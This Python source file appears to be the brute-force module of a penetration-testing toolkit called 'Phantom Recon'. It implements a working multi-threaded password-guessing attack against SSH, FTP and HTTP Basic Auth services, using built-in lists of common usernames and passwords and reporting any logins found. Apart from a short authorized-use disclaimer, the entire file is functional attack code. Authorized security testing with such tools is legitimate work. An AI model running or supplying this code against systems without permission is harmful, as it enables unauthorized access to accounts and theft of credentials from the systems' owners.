"""
Phantom Recon — Brute Force Module.

Multi-protocol credential testing for SSH, FTP, and HTTP services
with rate limiting and progress tracking.

⚠️ DISCLAIMER: For authorized security testing only. Unauthorized access
to computer systems is illegal. Always obtain written permission.
"""

import ftplib
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Callable, Optional

import requests

from phantom_recon.utils.logger import get_logger, create_progress, console

logger = get_logger(__name__)

# Built-in common credentials for testing
DEFAULT_USERNAMES = [
    "admin", "root", "administrator", "user", "test", "guest",
    "info", "mysql", "postgres", "oracle", "ftp", "anonymous",
]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "12345678", "root", "toor",
    "pass", "test", "guest", "master", "changeme", "default",
    "1234", "qwerty", "letmein", "welcome", "monkey", "dragon",
    "login", "abc123", "admin123", "password123", "P@ssw0rd",
]


@dataclass
class Credential:
    """A discovered valid credential."""
    username: str
    password: str
    service: str
    target: str
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()

    def to_dict(self) -> dict[str, str]:
        return {
            "username": self.username,
            "password": self.password,
            "service": self.service,
            "target": self.target,
            "timestamp": self.timestamp,
        }


class BruteForcer:
    """
    Multi-protocol credential brute forcer.

    Supports SSH, FTP, and HTTP Basic Auth with rate limiting,
    multi-threading, and progress tracking.

    Usage:
        brute = BruteForcer(target="192.168.1.1", service="ssh")
        results = brute.run()
    """

    def __init__(
        self,
        target: str,
        service: str = "ssh",
        port: Optional[int] = None,
        usernames: Optional[list[str]] = None,
        passwords: Optional[list[str]] = None,
        threads: int = 5,
        delay: float = 0.5,
        timeout: float = 10.0,
        on_success: Optional[Callable] = None,
    ):
        """
        Initialize the brute forcer.

        Args:
            target: Target host (IP or hostname).
            service: Service to brute force ('ssh', 'ftp', 'http').
            port: Custom port (auto-detected from service if not provided).
            usernames: List of usernames to try.
            passwords: List of passwords to try.
            threads: Concurrent threads (capped at 10 for safety).
            delay: Delay between attempts in seconds.
            timeout: Connection timeout.
            on_success: Callback function on successful login.
        """
        self.target = target
        self.service = service.lower()
        self.port = port or self._default_port()
        self.usernames = usernames or DEFAULT_USERNAMES
        self.passwords = passwords or DEFAULT_PASSWORDS
        self.threads = min(threads, 10)  # Safety cap
        self.delay = max(delay, 0.1)  # Minimum delay
        self.timeout = timeout
        self.on_success = on_success
        self._found: list[Credential] = []
        self._attempts: int = 0
        self._lock = threading.Lock()
        self._stop = threading.Event()

    def _default_port(self) -> int:
        """Get default port for the service."""
        ports = {
            "ssh": 22,
            "ftp": 21,
            "http": 80,
            "https": 443,
        }
        return ports.get(self.service, 22)

    def _try_ssh(self, username: str, password: str) -> bool:
        """
        Attempt SSH login.

        Args:
            username: SSH username.
            password: SSH password.

        Returns:
            True if login successful.
        """
        try:
            import paramiko

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=self.target,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=self.timeout,
            )
            client.close()
            return True
        except ImportError:
            logger.error("paramiko required for SSH brute force: pip install paramiko")
            self._stop.set()
            return False
        except Exception:
            return False

    def _try_ftp(self, username: str, password: str) -> bool:
        """
        Attempt FTP login.

        Args:
            username: FTP username.
            password: FTP password.

        Returns:
            True if login successful.
        """
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except (ftplib.error_perm, ftplib.error_reply, socket.timeout, OSError):
            return False

    def _try_http_basic(self, username: str, password: str) -> bool:
        """
        Attempt HTTP Basic Auth login.

        Args:
            username: HTTP username.
            password: HTTP password.

        Returns:
            True if login returns non-401 status.
        """
        try:
            scheme = "https" if self.port == 443 else "http"
            url = f"{scheme}://{self.target}:{self.port}"
            resp = requests.get(
                url,
                auth=(username, password),
                timeout=self.timeout,
                verify=False,
            )
            return resp.status_code != 401
        except requests.RequestException:
            return False

    def _attempt_login(self, username: str, password: str) -> Optional[Credential]:
        """
        Attempt a single login.

        Args:
            username: Username to try.
            password: Password to try.

        Returns:
            Credential if successful, None otherwise.
        """
        if self._stop.is_set():
            return None

        # Rate limiting
        time.sleep(self.delay)

        with self._lock:
            self._attempts += 1

        # Select brute force method based on service
        success = False
        if self.service == "ssh":
            success = self._try_ssh(username, password)
        elif self.service == "ftp":
            success = self._try_ftp(username, password)
        elif self.service in ("http", "https"):
            success = self._try_http_basic(username, password)

        if success:
            cred = Credential(
                username=username,
                password=password,
                service=self.service,
                target=f"{self.target}:{self.port}",
            )

            with self._lock:
                self._found.append(cred)

            logger.info(
                f"[bold green]✓ FOUND:[/bold green] "
                f"{username}:{password} @ {self.service}://{self.target}:{self.port}"
            )

            if self.on_success:
                self.on_success(cred)

            return cred

        return None

    def run(self) -> dict[str, Any]:
        """
        Execute the brute force attack.

        Returns:
            Dictionary with results and statistics.
        """
        start = datetime.now()
        total_combinations = len(self.usernames) * len(self.passwords)

        logger.info(
            f"Starting {self.service.upper()} brute force against "
            f"[bold magenta]{self.target}:{self.port}[/bold magenta] "
            f"({total_combinations} combinations, {self.threads} threads)"
        )

        # Build credential pairs
        pairs = [
            (user, passwd)
            for user in self.usernames
            for passwd in self.passwords
        ]

        with create_progress() as progress:
            task = progress.add_task(
                f"Brute forcing {self.service.upper()}",
                total=len(pairs),
            )

            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self._attempt_login, user, passwd): (user, passwd)
                    for user, passwd in pairs
                }

                for future in as_completed(futures):
                    progress.advance(task)
                    if self._stop.is_set():
                        break

        duration = (datetime.now() - start).total_seconds()

        return {
            "target": self.target,
            "port": self.port,
            "service": self.service,
            "start_time": start.isoformat(),
            "duration": round(duration, 2),
            "total_attempts": self._attempts,
            "found_count": len(self._found),
            "found": [c.to_dict() for c in self._found],
        }

    @classmethod
    def load_wordlist(cls, filepath: str) -> list[str]:
        """
        Load a wordlist from a file.

        Args:
            filepath: Path to wordlist file.

        Returns:
            List of words/lines.
        """
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"Wordlist not found: {filepath}")
            return []
